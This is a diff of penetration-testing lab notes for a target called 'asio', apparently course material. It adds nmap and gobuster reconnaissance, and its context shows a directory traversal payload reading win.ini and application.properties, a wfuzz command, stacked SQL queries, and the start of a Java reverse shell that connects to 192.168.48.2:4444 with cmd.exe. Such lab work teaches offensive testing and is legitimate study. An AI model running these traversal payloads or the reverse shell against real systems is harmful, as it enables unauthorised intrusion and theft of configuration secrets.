@@ -1,5 +1,18 @@
 ##### ASIO
 
+nmap scan
+
+```
+nmap asio
+
+sudo nmap -O -Pn asio
+
+```
+Content Discovery
+
+```
+gobuster dir -u http://asio -w /usr/share/wordlists/dirb/common.txt
+```
 In the previous Learning Unit, we identified the /specials?menu=winter.html endpoint
 
 We'll need to add several instances of "../" to our payload to traverse back to the base directory of the server. In Repeater, let's change "web200.html" to "../../../../../../../windows/win.ini" and click Send.
@@ -33,6 +46,17 @@ wfuzz -w paths.txt -w files.txt --hh 0 http://asio/specials?menu=FUZZFUZ2Z
 curl http://asio/specials?menu=../config/application.properties
 
 ```
+
+1
+(Webb, Syer, et al., 2016), https://docs.spring.io/spring-boot/docs/1.4.1.RELEASE/reference/html/boot-features-external-config.html#boot-features-external-config-application-property-files ↩︎
+
+2
+(Oracle, 2021), https://docs.oracle.com/javase/tutorial/essential/environment/paths.html ↩︎
+
+3
+(Xavi Mendez, 2020), https://wfuzz.readthedocs.io/en/latest/user/getting.html#multiple-payloads ↩︎
+
+
 
 We can verify this with a simple stacked query, such as selecting the SQL Server version.
 
@@ -117,7 +141,7 @@ import java.io.OutputStream;
 import java.net.Socket;
 
 class RevShell {
-    public static void main(String[] args) throws exception {
+    public static void main(String[] args) throws Exception {
         String host="192.168.48.2";
         int port=4444;
         String cmd="cmd.exe";
